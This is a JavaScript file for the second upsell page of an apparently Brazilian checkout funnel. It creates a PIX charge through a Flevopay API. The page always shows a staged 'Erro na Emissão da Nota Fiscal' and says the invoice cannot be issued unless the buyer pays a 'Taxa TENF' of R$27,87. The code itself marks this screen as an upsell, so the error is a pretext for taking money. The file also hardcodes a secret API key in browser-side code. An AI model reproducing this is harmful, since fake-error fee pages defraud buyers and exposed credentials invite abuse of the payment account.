/* Upsell Step 2: Taxa TENF — integrado com Flevopay */

const FLEVO_CONFIG_U2 = {
  endpoint: 'https://app.flevopay.com.br/api/v1/transaction',
  apiKey: 'sk_c1a9352aad997014b44aafa2609fb65ad38ad96e025b770166cb545a92fb04d9',
  productHash: 'prod_10b3a75f467b0a11'
};

;(function () {
  const AMOUNT_REAIS = 'R$ 27,87'

  const id      = qs('id', '')
  const content = document.getElementById('up-content')

  let customer = null
  try { customer = JSON.parse(localStorage.getItem('pdap-customer') || 'null') } catch {}

  let upsellId  = null
  let pixCode   = null
  let pixQrUrl  = null
  let pollTimer = null
  let pollCount = 0

  function nextPage() {
    clearInterval(pollTimer)
    location.href = `obrigado-3.html?id=${encodeURIComponent(id)}`
  }

  /* Se este step já foi pago nesta sessão, vai direto para o próximo */
  try { if (localStorage.getItem('pdap-upsell2-paid-' + id)) { nextPage(); return } } catch {}

  async function criarPixUpsell() {
    if (!customer) { nextPage(); return }
    try {
      const resp = await fetch(FLEVO_CONFIG_U2.endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': FLEVO_CONFIG_U2.apiKey
        },
        body: JSON.stringify({
          amount: 2787,
          description: 'Taxa TENF Emissão Nota Fiscal',
          reference: 'UPS2-' + (id || Date.now()) + '-' + Math.random().toString(36).slice(2, 6),
          productHash: FLEVO_CONFIG_U2.productHash,
          customer: {
            name: customer.name || 'Cliente',
            email: customer.email || 'cliente@email.com',
            phone: customer.phone || '11999999999',
            document: customer.document || '00000000000'
          },
          tracking: {
            utm_source: 'tiktok',
            utm_campaign: 'upsell-2'
          }
        })
      })
      const data = await resp.json()
      if (!resp.ok || data.error || data.status === 'error') throw new Error(data.error || data.message || 'Erro')
      
      upsellId = data.transaction_id || data.id
      pixCode  = data.qr_code || data.pixCode
      pixQrUrl = data.qr_code_base64 || data.pixQrCode || `https://api.qrserver.com/v1/create-qr-code/?size=192x192&margin=0&data=${encodeURIComponent(data.pixCode)}`
      renderPix()
    } catch {
      renderPix()
    }
  }

  async function checkUpsellPayment() {
    if (!upsellId || pollCount++ > 120) { clearInterval(pollTimer); return }
    try {
      const resp = await fetch(
        `${_EDGE_U2}/check-payment?orderId=${encodeURIComponent(upsellId)}&type=upsell`,
        { headers: { Authorization: `Bearer ${_ANON_U2}` } }
      )
      if (!resp.ok) return
      const data = await resp.json()
      if (data.status === 'paid') renderPaid()
    } catch {}
  }

  function renderOffer() {
    content.innerHTML = `
      <div class="offer-box">
        <div class="offer-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" x2="9" y1="9" y2="15"/><line x1="9" x2="15" y1="9" y2="15"/></svg>
        </div>
        <h1 class="offer-title">Erro na Emissão da Nota Fiscal</h1>
        <div class="offer-desc">
          <p style="margin:0">Para emitir a nota fiscal é necessário o pagamento da <strong>Taxa TENF</strong>.</p>
        </div>
        <div class="offer-price-row">
          <span class="lbl">Valor da Taxa TENF:</span>
          <span class="val">${AMOUNT_REAIS}</span>
        </div>
        <button type="button" class="btn-pagar" id="btn-pagar">Pagar a TENF</button>
        <div class="offer-note">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
          <div><span>Importante:</span> Sem o pagamento da Taxa TENF, a nota fiscal não poderá ser emitida.</div>
        </div>
      </div>`
    document.getElementById('btn-pagar').addEventListener('click', renderLoading)
  }

  function renderLoading() {
    content.innerHTML = `
      <div class="loader-box">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
        <p>Gerando pagamento PIX...</p>
      </div>`
    criarPixUpsell()
  }

  function renderPix() {
    if (!pixCode) { nextPage(); return }
    const qr = pixQrUrl || `https://api.qrserver.com/v1/create-qr-code/?size=192x192&margin=0&data=${encodeURIComponent(pixCode)}`
    content.innerHTML = `
      <div class="up-pix">
        <h2>Pague a taxa via PIX</h2>
        <p class="sub">Escaneie o QR Code ou copie o código para pagar</p>
        <div class="qr-wrap"><img src="${qr}" alt="QR Code PIX" width="192" height="192" /></div>
        <div class="amount">${AMOUNT_REAIS}</div>
        <p class="amount-sub">Pagamento via PIX • Aprovação instantânea</p>
        <div class="code-box">
          <div class="code-lbl">Código PIX Copia e Cola:</div>
          <div class="code-val">${escapeHtml(pixCode)}</div>
        </div>
        <button type="button" class="btn-copy" id="btn-copy-pix">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
          Copiar código PIX
        </button>
        <div class="pix-expiry">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
          <span>Este código expira em 30 minutos</span>
          <svg class="spin-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
        </div>
      </div>`
    document.getElementById('btn-copy-pix').addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(pixCode)
        const btn = document.getElementById('btn-copy-pix')
        btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> Copiado!`
        setTimeout(() => {
          if (btn) btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg> Copiar código PIX`
        }, 2500)
      } catch {}
    })
    if (upsellId) pollTimer = setInterval(checkUpsellPayment, 5000)
  }

  function renderPaid() {
    clearInterval(pollTimer)
    try { localStorage.setItem('pdap-upsell2-paid-' + id, '1') } catch {}
    /* Mesma trava de disparo único usada no caminho "já pago". */
    var _jaEnviado = false
    try { _jaEnviado = !!localStorage.getItem('pdap-upsell2-paid-' + id + '-sent') } catch {}
    if (!_jaEnviado) {
      if (typeof ttk !== 'undefined') ttk.upsellPurchase(2, 2787, upsellId)
      try { localStorage.setItem('pdap-upsell2-paid-' + id + '-sent', '1') } catch {}
    }
    content.innerHTML = `
      <div class="paid-box">
        <div class="paid-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg></div>
        <h2 style="font-size:1.125rem;font-weight:700;color:#111827;margin:0 0 .25rem;">Pagamento confirmado! 🎉</h2>
        <p style="font-size:.875rem;color:#6b7280;">Redirecionando...</p>
      </div>`
    setTimeout(nextPage, 1800)
  }

  renderOffer()
})()
